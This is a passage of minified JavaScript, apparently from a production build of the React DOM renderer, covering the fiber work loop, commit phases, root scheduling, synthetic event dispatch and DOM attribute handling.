i=n[r],a=i.getSnapshot;i=i.value;try{if(!kr(a(),i))return!1}catch{return!1}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function yu(e,t,n,r){t&=~ql,t&=~Kl,e.suspendedLanes|=t,e.pingedLanes&=~t,r&&(e.warmLanes|=t),r=e.expirationTimes;for(var i=t;0<i;){var a=31-Je(i),o=1<<a;r[a]=-1,i&=~o}n!==0&&lt(e,n,t)}function bu(){return G&6?!0:(id(0,!1),!1)}function xu(){if(q!==null){if(Y===0)var e=q.return;else e=q,$i=Qi=null,Mo(e),La=null,Ra=0,e=q;for(;e!==null;)Hc(e.alternate,e),e=e.return;q=null}}function Su(e,t){var n=e.timeoutHandle;n!==-1&&(e.timeoutHandle=-1,qd(n)),n=e.cancelPendingCommit,n!==null&&(e.cancelPendingCommit=null,n()),su=0,xu(),K=e,q=n=_i(e.current,null),J=t,Y=0,Bl=null,Vl=!1,Hl=rt(e,t),Ul=!1,Yl=Jl=ql=Kl=Gl=X=0,Zl=Xl=null,Ql=!1,t&8&&(t|=t&32);var r=e.entangledLanes;if(r!==0)for(e=e.entanglements,r&=t;0<r;){var i=31-Je(r),a=1<<i;t|=e[i],r&=~a}return Wl=t,si(),n}function Cu(e,t){I=null,T.H=Vs,t===Da||t===ka?(t=Fa(),Y=3):t===Oa?(t=Fa(),Y=4):Y=t===ac?8:typeof t==`object`&&t&&typeof t.then==`function`?6:1,Bl=t,q===null&&(X=1,$s(e,Ti(t,e.current)))}function wu(){var e=co.current;return e===null?!0:(J&4194048)===J?lo===null:(J&62914560)===J||J&536870912?e===lo:!1}function Tu(){var e=T.H;return T.H=Vs,e===null?Vs:e}function Eu(){var e=T.A;return T.A=Rl,e}function Du(){X=4,Vl||(J&4194048)!==J&&co.current!==null||(Hl=!0),!(Gl&134217727)&&!(Kl&134217727)||K===null||yu(K,J,Jl,!1)}function Ou(e,t,n){var r=G;G|=2;var i=Tu(),a=Eu();(K!==e||J!==t)&&(nu=null,Su(e,t)),t=!1;var o=X;a:do try{if(Y!==0&&q!==null){var s=q,c=Bl;switch(Y){case 8:xu(),o=6;break a;case 3:case 2:case 9:case 6:co.current===null&&(t=!0);var l=Y;if(Y=0,Bl=null,Pu(e,s,c,l),n&&Hl){o=0;break a}break;default:l=Y,Y=0,Bl=null,Pu(e,s,c,l)}}ku(),o=X;break}catch(t){Cu(e,t)}while(1);return t&&e.shellSuspendCounter++,$i=Qi=null,G=r,T.H=i,T.A=a,q===null&&(K=null,J=0,si()),o}function ku(){for(;q!==null;)Mu(q)}function Au(e,t){var n=G;G|=2;var r=Tu(),i=Eu();K!==e||J!==t?(nu=null,tu=Ie()+500,Su(e,t)):Hl=rt(e,t);a:do try{if(Y!==0&&q!==null){t=q;var a=Bl;b:switch(Y){case 1:Y=0,Bl=null,Pu(e,t,a,1);break;case 2:case 9:if(ja(a)){Y=0,Bl=null,Nu(t);break}t=function(){Y!==2&&Y!==9||K!==e||(Y=7),rd(e)},a.then(t,t);break a;case 3:Y=7;break a;case 4:Y=5;break a;case 7:ja(a)?(Y=0,Bl=null,Nu(t)):(Y=0,Bl=null,Pu(e,t,a,7));break;case 5:var s=null;switch(q.tag){case 26:s=q.memoizedState;case 5:case 27:var c=q;if(s?Wf(s):c.stateNode.complete){Y=0,Bl=null;var l=c.sibling;if(l!==null)q=l;else{var u=c.return;u===null?q=null:(q=u,Fu(u))}break b}}Y=0,Bl=null,Pu(e,t,a,5);break;case 6:Y=0,Bl=null,Pu(e,t,a,6);break;case 8:xu(),X=6;break a;default:throw Error(o(462))}}ju();break}catch(t){Cu(e,t)}while(1);return $i=Qi=null,T.H=r,T.A=i,G=n,q===null?(K=null,J=0,si(),X):0}function ju(){for(;q!==null&&!Pe();)Mu(q)}function Mu(e){var t=Pc(e.alternate,e,Wl);e.memoizedProps=e.pendingProps,t===null?Fu(e):q=t}function Nu(e){var t=e,n=t.alternate;switch(t.tag){case 15:case 0:t=vc(n,t,t.pendingProps,t.type,void 0,J);break;case 11:t=vc(n,t,t.pendingProps,t.type.render,t.ref,J);break;case 5:Mo(t);default:Hc(n,t),t=q=vi(t,Wl),t=Pc(n,t,Wl)}e.memoizedProps=e.pendingProps,t===null?Fu(e):q=t}function Pu(e,t,n,r){$i=Qi=null,Mo(t),La=null,Ra=0;var i=t.return;try{if(ic(e,i,t,n,J)){X=1,$s(e,Ti(n,e.current)),q=null;return}}catch(t){if(i!==null)throw q=i,t;X=1,$s(e,Ti(n,e.current)),q=null;return}t.flags&32768?(N||r===1?e=!0:Hl||J&536870912?e=!1:(Vl=e=!0,(r===2||r===9||r===3||r===6)&&(r=co.current,r!==null&&r.tag===13&&(r.flags|=16384))),Iu(t,e)):Fu(t)}function Fu(e){var t=e;do{if(t.flags&32768){Iu(t,Vl);return}e=t.return;var n=Bc(t.alternate,t,Wl);if(n!==null){q=n;return}if(t=t.sibling,t!==null){q=t;return}q=t=e}while(t!==null);X===0&&(X=5)}function Iu(e,t){do{var n=Vc(e.alternate,e);if(n!==null){n.flags&=32767,q=n;return}if(n=e.return,n!==null&&(n.flags|=32768,n.subtreeFlags=0,n.deletions=null),!t&&(e=e.sibling,e!==null)){q=e;return}q=e=n}while(e!==null);X=6,q=null}function Lu(e,t,n,r,i,a,s,c,l){e.cancelPendingCommit=null;do Hu();while(iu!==0);if(G&6)throw Error(o(327));if(t!==null){if(t===e.current)throw Error(o(177));if(a=t.lanes|t.childLanes,a|=oi,ct(e,n,a,s,c,l),e===K&&(q=K=null,J=0),ou=t,au=e,su=n,cu=a,lu=i,uu=r,t.subtreeFlags&10256||t.flags&10256?(e.callbackNode=null,e.callbackPriority=0,Xu(Be,function(){return Uu(),null})):(e.callbackNode=null,e.callbackPriority=0),r=(t.flags&13878)!=0,t.subtreeFlags&13878||r){r=T.T,T.T=null,i=E.p,E.p=2,s=G,G|=4;try{ol(e,t,n)}finally{G=s,E.p=i,T.T=r}}iu=1,Ru(),zu(),Bu()}}function Ru(){if(iu===1){iu=0;var e=au,t=ou,n=(t.flags&13878)!=0;if(t.subtreeFlags&13878||n){n=T.T,T.T=null;var r=E.p;E.p=2;var i=G;G|=4;try{vl(t,e);var a=zd,o=Pr(e.containerInfo),s=a.focusedElem,c=a.selectionRange;if(o!==s&&s&&s.ownerDocument&&Nr(s.ownerDocument.documentElement,s)){if(c!==null&&Fr(s)){var l=c.start,u=c.end;if(u===void 0&&(u=l),`selectionStart`in s)s.selectionStart=l,s.selectionEnd=Math.min(u,s.value.length);else{var d=s.ownerDocument||document,f=d&&d.defaultView||window;if(f.getSelection){var p=f.getSelection(),m=s.textContent.length,h=Math.min(c.start,m),g=c.end===void 0?h:Math.min(c.end,m);!p.extend&&h>g&&(o=g,g=h,h=o);var _=Mr(s,h),v=Mr(s,g);if(_&&v&&(p.rangeCount!==1||p.anchorNode!==_.node||p.anchorOffset!==_.offset||p.focusNode!==v.node||p.focusOffset!==v.offset)){var y=d.createRange();y.setStart(_.node,_.offset),p.removeAllRanges(),h>g?(p.addRange(y),p.extend(v.node,v.offset)):(y.setEnd(v.node,v.offset),p.addRange(y))}}}}for(d=[],p=s;p=p.parentNode;)p.nodeType===1&&d.push({element:p,left:p.scrollLeft,top:p.scrollTop});for(typeof s.focus==`function`&&s.focus(),s=0;s<d.length;s++){var b=d[s];b.element.scrollLeft=b.left,b.element.scrollTop=b.top}}sp=!!Rd,zd=Rd=null}finally{G=i,E.p=r,T.T=n}}e.current=t,iu=2}}function zu(){if(iu===2){iu=0;var e=au,t=ou,n=(t.flags&8772)!=0;if(t.subtreeFlags&8772||n){n=T.T,T.T=null;var r=E.p;E.p=2;var i=G;G|=4;try{sl(e,t.alternate,t)}finally{G=i,E.p=r,T.T=n}}iu=3}}function Bu(){if(iu===4||iu===3){iu=0,Fe();var e=au,t=ou,n=su,r=uu;t.subtreeFlags&10256||t.flags&10256?iu=5:(iu=0,ou=au=null,Vu(e,e.pendingLanes));var i=e.pendingLanes;if(i===0&&(ru=null),pt(n),t=t.stateNode,Ke&&typeof Ke.onCommitFiberRoot==`function`)try{Ke.onCommitFiberRoot(Ge,t,void 0,(t.current.flags&128)==128)}catch{}if(r!==null){t=T.T,i=E.p,E.p=2,T.T=null;try{for(var a=e.onRecoverableError,o=0;o<r.length;o++){var s=r[o];a(s.value,{componentStack:s.stack})}}finally{T.T=t,E.p=i}}su&3&&Hu(),rd(e),i=e.pendingLanes,n&261930&&i&42?e===fu?du++:(du=0,fu=e):du=0,id(0,!1)}}function Vu(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,ma(t)))}function Hu(){return Ru(),zu(),Bu(),Uu()}function Uu(){if(iu!==5)return!1;var e=au,t=cu;cu=0;var n=pt(su),r=T.T,i=E.p;try{E.p=32>n?32:n,T.T=null,n=lu,lu=null;var a=au,s=su;if(iu=0,ou=au=null,su=0,G&6)throw Error(o(331));var c=G;if(G|=4,Fl(a.current),Dl(a,a.current,s,n),G=c,id(0,!1),Ke&&typeof Ke.onPostCommitFiberRoot==`function`)try{Ke.onPostCommitFiberRoot(Ge,a)}catch{}return!0}finally{E.p=i,T.T=r,Vu(e,t)}}function Wu(e,t,n){t=Ti(n,t),t=tc(e.stateNode,t,2),e=Ya(e,t,2),e!==null&&(st(e,2),rd(e))}function Z(e,t,n){if(e.tag===3)Wu(e,e,n);else for(;t!==null;){if(t.tag===3){Wu(t,e,n);break}else if(t.tag===1){var r=t.stateNode;if(typeof t.type.getDerivedStateFromError==`function`||typeof r.componentDidCatch==`function`&&(ru===null||!ru.has(r))){e=Ti(n,e),n=nc(2),r=Ya(t,n,2),r!==null&&(rc(n,r,t,e),st(r,2),rd(r));break}}t=t.return}}function Gu(e,t,n){var r=e.pingCache;if(r===null){r=e.pingCache=new zl;var i=new Set;r.set(t,i)}else i=r.get(t),i===void 0&&(i=new Set,r.set(t,i));i.has(n)||(Ul=!0,i.add(n),e=Ku.bind(null,e,t,n),t.then(e,e))}function Ku(e,t,n){var r=e.pingCache;r!==null&&r.delete(t),e.pingedLanes|=e.suspendedLanes&n,e.warmLanes&=~n,K===e&&(J&n)===n&&(X===4||X===3&&(J&62914560)===J&&300>Ie()-$l?!(G&2)&&Su(e,0):ql|=n,Yl===J&&(Yl=0)),rd(e)}function qu(e,t){t===0&&(t=at()),e=ui(e,t),e!==null&&(st(e,t),rd(e))}function Ju(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),qu(e,n)}function Yu(e,t){var n=0;switch(e.tag){case 31:case 13:var r=e.stateNode,i=e.memoizedState;i!==null&&(n=i.retryLane);break;case 19:r=e.stateNode;break;case 22:r=e.stateNode._retryCache;break;default:throw Error(o(314))}r!==null&&r.delete(t),qu(e,n)}function Xu(e,t){return Me(e,t)}var Zu=null,Qu=null,$u=!1,ed=!1,td=!1,nd=0;function rd(e){e!==Qu&&e.next===null&&(Qu===null?Zu=Qu=e:Qu=Qu.next=e),ed=!0,$u||($u=!0,ud())}function id(e,t){if(!td&&ed){td=!0;do for(var n=!1,r=Zu;r!==null;){if(!t)if(e!==0){var i=r.pendingLanes;if(i===0)var a=0;else{var o=r.suspendedLanes,s=r.pingedLanes;a=(1<<31-Je(42|e)+1)-1,a&=i&~(o&~s),a=a&201326741?a&201326741|1:a?a|2:0}a!==0&&(n=!0,ld(r,a))}else a=J,a=nt(r,r===K?a:0,r.cancelPendingCommit!==null||r.timeoutHandle!==-1),!(a&3)||rt(r,a)||(n=!0,ld(r,a));r=r.next}while(n);td=!1}}function ad(){od()}function od(){ed=$u=!1;var e=0;nd!==0&&Gd()&&(e=nd);for(var t=Ie(),n=null,r=Zu;r!==null;){var i=r.next,a=sd(r,t);a===0?(r.next=null,n===null?Zu=i:n.next=i,i===null&&(Qu=n)):(n=r,(e!==0||a&3)&&(ed=!0)),r=i}iu!==0&&iu!==5||id(e,!1),nd!==0&&(nd=0)}function sd(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,i=e.expirationTimes,a=e.pendingLanes&-62914561;0<a;){var o=31-Je(a),s=1<<o,c=i[o];c===-1?((s&n)===0||(s&r)!==0)&&(i[o]=it(s,t)):c<=t&&(e.expiredLanes|=s),a&=~s}if(t=K,n=J,n=nt(e,e===t?n:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),r=e.callbackNode,n===0||e===t&&(Y===2||Y===9)||e.cancelPendingCommit!==null)return r!==null&&r!==null&&Ne(r),e.callbackNode=null,e.callbackPriority=0;if(!(n&3)||rt(e,n)){if(t=n&-n,t===e.callbackPriority)return t;switch(r!==null&&Ne(r),pt(n)){case 2:case 8:n=ze;break;case 32:n=Be;break;case 268435456:n=He;break;default:n=Be}return r=cd.bind(null,e),n=Me(n,r),e.callbackPriority=t,e.callbackNode=n,t}return r!==null&&r!==null&&Ne(r),e.callbackPriority=2,e.callbackNode=null,2}function cd(e,t){if(iu!==0&&iu!==5)return e.callbackNode=null,e.callbackPriority=0,null;var n=e.callbackNode;if(Hu()&&e.callbackNode!==n)return null;var r=J;return r=nt(e,e===K?r:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),r===0?null:(gu(e,r,t),sd(e,Ie()),e.callbackNode!=null&&e.callbackNode===n?cd.bind(null,e):null)}function ld(e,t){if(Hu())return null;gu(e,t,!0)}function ud(){Yd(function(){G&6?Me(Re,ad):od()})}function dd(){if(nd===0){var e=_a;e===0&&(e=Qe,Qe<<=1,!(Qe&261888)&&(Qe=256)),nd=e}return nd}function fd(e){return e==null||typeof e==`symbol`||typeof e==`boolean`?null:typeof e==`function`?e:ln(``+e)}function pd(e,t){var n=t.ownerDocument.createElement(`input`);return n.name=t.name,n.value=t.value,e.id&&n.setAttribute(`form`,e.id),t.parentNode.insertBefore(n,t),e=new FormData(e),n.parentNode.removeChild(n),e}function md(e,t,n,r,i){if(t===`submit`&&n&&n.stateNode===i){var a=fd((i[_t]||null).action),o=r.submitter;o&&(t=(t=o[_t]||null)?fd(t.formAction):o.getAttribute(`formAction`),t!==null&&(a=t,o=null));var s=new jn(`action`,`action`,null,r,i);e.push({event:s,listeners:[{instance:null,listener:function(){if(r.defaultPrevented){if(nd!==0){var e=o?pd(i,o):new FormData(i);Ds(n,{pending:!0,data:e,method:i.method,action:a},null,e)}}else typeof a==`function`&&(s.preventDefault(),e=o?pd(i,o):new FormData(i),Ds(n,{pending:!0,data:e,method:i.method,action:a},a,e))},currentTarget:i}]})}}for(var hd=0;hd<ti.length;hd++){var gd=ti[hd];ni(gd.toLowerCase(),`on`+(gd[0].toUpperCase()+gd.slice(1)))}ni(qr,`onAnimationEnd`),ni(Jr,`onAnimationIteration`),ni(Yr,`onAnimationStart`),ni(`dblclick`,`onDoubleClick`),ni(`focusin`,`onFocus`),ni(`focusout`,`onBlur`),ni(Xr,`onTransitionRun`),ni(Zr,`onTransitionStart`),ni(Qr,`onTransitionCancel`),ni($r,`onTransitionEnd`),Nt(`onMouseEnter`,[`mouseout`,`mouseover`]),Nt(`onMouseLeave`,[`mouseout`,`mouseover`]),Nt(`onPointerEnter`,[`pointerout`,`pointerover`]),Nt(`onPointerLeave`,[`pointerout`,`pointerover`]),Mt(`onChange`,`change click focusin focusout input keydown keyup selectionchange`.split(` `)),Mt(`onSelect`,`focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange`.split(` `)),Mt(`onBeforeInput`,[`compositionend`,`keypress`,`textInput`,`paste`]),Mt(`onCompositionEnd`,`compositionend focusout keydown keypress keyup mousedown`.split(` `)),Mt(`onCompositionStart`,`compositionstart focusout keydown keypress keyup mousedown`.split(` `)),Mt(`onCompositionUpdate`,`compositionupdate focusout keydown keypress keyup mousedown`.split(` `));var _d=`abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting`.split(` `),vd=new Set(`beforetoggle cancel close invalid load scroll scrollend toggle`.split(` `).concat(_d));function yd(e,t){t=(t&4)!=0;for(var n=0;n<e.length;n++){var r=e[n],i=r.event;r=r.listeners;a:{var a=void 0;if(t)for(var o=r.length-1;0<=o;o--){var s=r[o],c=s.instance,l=s.currentTarget;if(s=s.listener,c!==a&&i.isPropagationStopped())break a;a=s,i.currentTarget=l;try{a(i)}catch(e){ri(e)}i.currentTarget=null,a=c}else for(o=0;o<r.length;o++){if(s=r[o],c=s.instance,l=s.currentTarget,s=s.listener,c!==a&&i.isPropagationStopped())break a;a=s,i.currentTarget=l;try{a(i)}catch(e){ri(e)}i.currentTarget=null,a=c}}}}function Q(e,t){var n=t[yt];n===void 0&&(n=t[yt]=new Set);var r=e+`__bubble`;n.has(r)||(Cd(t,e,2,!1),n.add(r))}function bd(e,t,n){var r=0;t&&(r|=4),Cd(n,e,r,t)}var xd=`_reactListening`+Math.random().toString(36).slice(2);function Sd(e){if(!e[xd]){e[xd]=!0,At.forEach(function(t){t!==`selectionchange`&&(vd.has(t)||bd(t,!1,e),bd(t,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[xd]||(t[xd]=!0,bd(`selectionchange`,!1,t))}}function Cd(e,t,n,r){switch(mp(t)){case 2:var i=cp;break;case 8:i=lp;break;default:i=up}n=i.bind(null,t,n,e),i=void 0,!bn||t!==`touchstart`&&t!==`touchmove`&&t!==`wheel`||(i=!0),r?i===void 0?e.addEventListener(t,n,!0):e.addEventListener(t,n,{capture:!0,passive:i}):i===void 0?e.addEventListener(t,n,!1):e.addEventListener(t,n,{passive:i})}function wd(e,t,n,r,i){var a=r;if(!(t&1)&&!(t&2)&&r!==null)a:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var s=r.stateNode.containerInfo;if(s===i)break;if(o===4)for(o=r.return;o!==null;){var c=o.tag;if((c===3||c===4)&&o.stateNode.containerInfo===i)return;o=o.return}for(;s!==null;){if(o=Tt(s),o===null)return;if(c=o.tag,c===5||c===6||c===26||c===27){r=a=o;continue a}s=s.parentNode}}r=r.return}_n(function(){var r=a,i=fn(n),o=[];a:{var s=ei.get(e);if(s!==void 0){var c=jn,u=e;switch(e){case`keypress`:if(En(n)===0)break a;case`keydown`:case`keyup`:c=Jn;break;case`focusin`:u=`focus`,c=zn;break;case`focusout`:u=`blur`,c=zn;break;case`beforeblur`:case`afterblur`:c=zn;break;case`click`:if(n.button===2)break a;case`auxclick`:case`dblclick`:case`mousedown`:case`mousemove`:case`mouseup`:case`mouseout`:case`mouseover`:case`contextmenu`:c=Rn;break;case`drag`:case`dragend`:case`dragenter`:case`dragexit`:case`dragleave`:case`dragover`:case`dragstart`:case`drop`:c=k;break;case`touchcancel`:case`touchend`:case`touchmove`:case`touchstart`:c=Xn;break;case qr:case Jr:case Yr:c=Bn;break;case $r:c=Zn;break;case`scroll`:case`scrollend`:c=Nn;break;case`wheel`:c=Qn;break;case`copy`:case`cut`:case`paste`:c=Vn;break;case`gotpointercapture`:case`lostpointercapture`:case`pointercancel`:case`pointerdown`:case`pointermove`:case`pointerout`:case`pointerover`:case`pointerup`:c=Yn;break;case`toggle`:case`beforetoggle`:c=$n}var d=(t&4)!=0,f=!d&&(e===`scroll`||e===`scrollend`),p=d?s===null?null:s+`Capture`:s;d=[];for(var m=r,h;m!==null;){var g=m;if(h=g.stateNode,g=g.tag,g!==5&&g!==26&&g!==27||h===null||p===null||(g=vn(m,p),g!=null&&d.push(Td(m,g,h))),f)break;m=m.return}0<d.length&&(s=new c(s,u,null,n,i),o.push({event:s,listeners:d}))}}if(!(t&7)){a:{if(s=e===`mouseover`||e===`pointerover`,c=e===`mouseout`||e===`pointerout`,s&&n!==dn&&(u=n.relatedTarget||n.fromElement)&&(Tt(u)||u[vt]))break a;if((c||s)&&(s=i.window===i?i:(s=i.ownerDocument)?s.defaultView||s.parentWindow:window,c?(u=n.relatedTarget||n.toElement,c=r,u=u?Tt(u):null,u!==null&&(f=l(u),d=u.tag,u!==f||d!==5&&d!==27&&d!==6)&&(u=null)):(c=null,u=r),c!==u)){if(d=Rn,g=`onMouseLeave`,p=`onMouseEnter`,m=`mouse`,(e===`pointerout`||e===`pointerover`)&&(d=Yn,g=`onPointerLeave`,p=`onPointerEnter`,m=`pointer`),f=c==null?s:Dt(c),h=u==null?s:Dt(u),s=new d(g,m+`leave`,c,n,i),s.target=f,s.relatedTarget=h,g=null,Tt(i)===r&&(d=new d(p,m+`enter`,u,n,i),d.target=h,d.relatedTarget=f,g=d),f=g,c&&u)b:{for(d=Dd,p=c,m=u,h=0,g=p;g;g=d(g))h++;g=0;for(var _=m;_;_=d(_))g++;for(;0<h-g;)p=d(p),h--;for(;0<g-h;)m=d(m),g--;for(;h--;){if(p===m||m!==null&&p===m.alternate){d=p;break b}p=d(p),m=d(m)}d=null}else d=null;c!==null&&Od(o,s,c,d,!1),u!==null&&f!==null&&Od(o,f,u,d,!0)}}a:{if(s=r?Dt(r):window,c=s.nodeName&&s.nodeName.toLowerCase(),c===`select`||c===`input`&&s.type===`file`)var v=_r;else if(dr(s))if(vr)v=Dr;else{v=Tr;var y=wr}else c=s.nodeName,!c||c.toLowerCase()!==`input`||s.type!==`checkbox`&&s.type!==`radio`?r&&on(r.elementType)&&(v=_r):v=Er;if(v&&=v(e,r)){fr(o,v,n,i);break a}y&&y(e,s,r),e===`focusout`&&r&&s.type===`number`&&r.memoizedProps.value!=null&&Zt(s,`number`,s.value)}switch(y=r?Dt(r):window,e){case`focusin`:(dr(y)||y.contentEditable===`true`)&&(Lr=y,Rr=r,zr=null);break;case`focusout`:zr=Rr=Lr=null;break;case`mousedown`:Br=!0;break;case`contextmenu`:case`mouseup`:case`dragend`:Br=!1,Vr(o,n,i);break;case`selectionchange`:if(Ir)break;case`keydown`:case`keyup`:Vr(o,n,i)}var b;if(tr)b:{switch(e){case`compositionstart`:var x=`onCompositionStart`;break b;case`compositionend`:x=`onCompositionEnd`;break b;case`compositionupdate`:x=`onCompositionUpdate`;break b}x=void 0}else cr?or(e,n)&&(x=`onCompositionEnd`):e===`keydown`&&n.keyCode===229&&(x=`onCompositionStart`);x&&(rr&&n.locale!==`ko`&&(cr||x!==`onCompositionStart`?x===`onCompositionEnd`&&cr&&(b=Tn()):(Sn=i,Cn=`value`in Sn?Sn.value:Sn.textContent,cr=!0)),y=Ed(r,x),0<y.length&&(x=new Hn(x,e,null,n,i),o.push({event:x,listeners:y}),b?x.data=b:(b=sr(n),b!==null&&(x.data=b)))),(b=A?j(e,n):lr(e,n))&&(x=Ed(r,`onBeforeInput`),0<x.length&&(y=new Hn(`onBeforeInput`,`beforeinput`,null,n,i),o.push({event:y,listeners:x}),y.data=b)),md(o,e,r,n,i)}yd(o,t)})}function Td(e,t,n){return{instance:e,listener:t,currentTarget:n}}function Ed(e,t){for(var n=t+`Capture`,r=[];e!==null;){var i=e,a=i.stateNode;if(i=i.tag,i!==5&&i!==26&&i!==27||a===null||(i=vn(e,n),i!=null&&r.unshift(Td(e,i,a)),i=vn(e,t),i!=null&&r.push(Td(e,i,a))),e.tag===3)return r;e=e.return}return[]}function Dd(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function Od(e,t,n,r,i){for(var a=t._reactName,o=[];n!==null&&n!==r;){var s=n,c=s.alternate,l=s.stateNode;if(s=s.tag,c!==null&&c===r)break;s!==5&&s!==26&&s!==27||l===null||(c=l,i?(l=vn(n,a),l!=null&&o.unshift(Td(n,l,c))):i||(l=vn(n,a),l!=null&&o.push(Td(n,l,c)))),n=n.return}o.length!==0&&e.push({event:t,listeners:o})}var kd=/\r\n?/g,Ad=/\u0000|\uFFFD/g;function jd(e){return(typeof e==`string`?e:``+e).replace(kd,`
`).replace(Ad,``)}function Md(e,t){return t=jd(t),jd(e)===t}function $(e,t,n,r,i,a){switch(n){case`children`:typeof r==`string`?t===`body`||t===`textarea`&&r===``||tn(e,r):(typeof r==`number`||typeof r==`bigint`)&&t!==`body`&&tn(e,``+r);break;case`className`:zt(e,`class`,r);break;case`tabIndex`:zt(e,`tabindex`,r);break;case`dir`:case`role`:case`viewBox`:case`width`:case`height`:zt(e,n,r);break;case`style`:an(e,r,a);break;case`data`:if(t!==`object`){zt(e,`data`,r);break}case`src`:case`href`:if(r===``&&(t!==`a`||n!==`href`)){e.removeAttribute(n);break}if(r==null||typeof r==`function`||typeof r==`symbol`||typeof r==`boolean`){e.removeAttribute(n);break}r=ln(``+r),e.setAttribute(n,r);break;case`action`:case`formAction`:if(typeof r==`function`){e.setAttribute(n,`javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')`);break}else typeof a==`function`&&(n===`formAction`?(t!==`input`&&$(e,t,`name`,i.name,i,null),$(e,t,`formEncType`,i.formEncType,i,null),$(e,t,`formMethod`,i.formMethod,i,null),$(e,t,`formTarget`,i.formTarget,i,null)):($(e,t,`encType`,i.encType,i,null),$(e,t,`method`,i.method,i,null),$(e,t,`target`,i.target,i,null)));if(r==null||typeof r==`symbol`||typeof r==`boolean`){e.removeAttribute(n);break}r=ln(``+r),e.setAttribute(n,r);break;case`onClick`:r!=null&&(e.onclick=un);break;case`onScroll`:r!=null&&Q(`scroll`,e);break;case`onScrollEnd`:r!=null&&Q(`scrollend`,e);break;case`dangerouslySetInnerHTML`:if(r!=null){if(typeof r!=`object`||!(`__html`in r))throw Error(o(61));if(n=r.__html,n!=null){if(i.children!=null)throw Error(o(60));e.innerHTML=n}}break;case`multiple`:e.multiple=r&&typeof r!=`function`&&typeof r!=`symbol`;break;case`muted`:e.muted=r&&typeof r!=`function`&&typeof r!=`symbol`;break;case`suppressContentEditableWarning`:case`suppressHydrationWarning`:case`defaultValue`:case`defaultChecked`:case`innerHTML`:case`ref`:break;case`autoFocus`:break;case`xlinkHref`:if(r==null||typeof r==`function`||typeof r==`boolean`||typeof r==`symbol`){e.removeAttribute(`xlink:href`);break}n=ln(``+r),e.setAttributeNS(`http://www.w3.org/1999/xlink`,`xlink:href`,n);break;case`contentEditable`:case`spellCheck`:case`draggable`:case`value`:case`autoReverse`:case`externalResourcesRequired`:case`focusable`:case`preserveAlpha`:r!=null&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,``+r):e.removeAttribute(n);break;case`inert`:case`allowFullScreen`:case`async`:case`autoPlay`:case`controls`:case`default`:case`defer`:case`disabled`:case`disablePictureInPicture`:case`disableRemotePlayback`:case`formNoValidate`:case`hidden`:case`loop`:case`noModule`:case`noValidate`:case`open`:case`playsInline`:case`readOnly`:case`required`:case`reversed`:case`scoped`:case`seamless`:case`itemScope`:r&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,``):e.removeAttribute(n);break;case`capture`:case`download`:!0===r?e.setAttribute(n,``):!1!==r&&r!=null&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,r):e.removeAttribute(n);break;case`cols`:case`rows`:case`size`:case`span`:r!=null&&typeof r!=`function`&&typeof r!=`symbol`&&!isNaN(r)&&1<=r?e.setAttribute(n,r):e.removeAttribute(n);break;case`rowSpan`:case`start`:r==null||typeof r==`function`||typeof r==`symbol`||isNaN(r)?e.removeAttribute(n):e.setAttribute(n,r);break;case`popover`:Q(`beforetoggle`,e),Q(`toggle`,e),Rt(e,`popover`,r);break;case`xlinkActuate`:Bt(e,`http://www.w3.org/1999/xlink`,`xlink:actuate`,r);break;case`xlinkArcrole`:Bt(e,`http://www.w3.org/1999/xlink`,`xlink:arcrole`,r);break;case`xlinkRole`:Bt(e,`http://www.w3.org/1999/xlink`,`xlink:role`,r);break;case`xlinkShow`:Bt(e,`http://www.w3.org/1999/xlink`,`xlink:show`,r);break;case`xlinkTitle`:Bt(e,`http://www.w3.org/1999/xlink`,`xlink:title`,r);break;case`xlinkType`:Bt(e,`http://www.w3.org/1999/xlink`,`xlink:type`,r);break;case`xmlBase`:Bt(e,`http://www.w3.org/XML/1998/namespace`,`xml:base`,r);break;case`xmlLang`:Bt(e,`http://www.w3.org/XML/1998/namespace`,`xml:lang`,r);break;case`xmlSpace`:Bt(e,`http://www.w3.org/XML/1998/namespace`,`xml:space`,r);break;case`is`:Rt(e,`is`,r);break;case`innerText`:case`textContent`:break;default:(!(2<n.length)||n[0]!==`o`&&n[0]!==`O`||n[1]!==`n`&&n[1]!==`N`)&&(n=sn.get(n)||n,Rt(e,n,r))}}function Nd(e,t,n,r,i,a){switch(n){case`style`:an(e,r,a);break;case`dangerouslySetInnerHTML`:if(r!=null){if(typeof r!=`object`||!(`__html`in r))throw Error(o(61));if(n=r.__html,n!=null){if(i.children!=null)throw Error(o(60));e.innerHTML=n}}break;case`children`:typeof r==`string`?tn(e,r):(typeof r==`number`||typeof r==`bigint`)&&tn(e,``+r);break;case`onScroll`:r!=null&&Q(`scroll`,e);break;case`onScrollEnd`:r!=null&&Q(`scrollend`,e);break;case`onClick`:r!=null&&(e.onclick=un);break;case`suppressContentEditableWarning`:case`suppressHydrationWarning`:case`innerHTML`:case`ref`:break;case`innerText`:case`textContent`:break;default:if(!jt.hasOwnProperty(n))a:{if(n[0]===`o`&&n[1]===`n`&&(i=n.endsWith(`Capture`),t=n.slice(2,i?n.length-7:void 0),a=e[_t]||null,a=a==null?null:a[n],typeof a==`function`&&e.removeEventListener(t,a,i),typeof r==`function`)){typeof a!=`function`&&a!==null&&(n in e?e[n]=null:e.hasAttribute(n)&&e.removeAttribute(n)),e.addEventListener(t,r,i);break a}n in 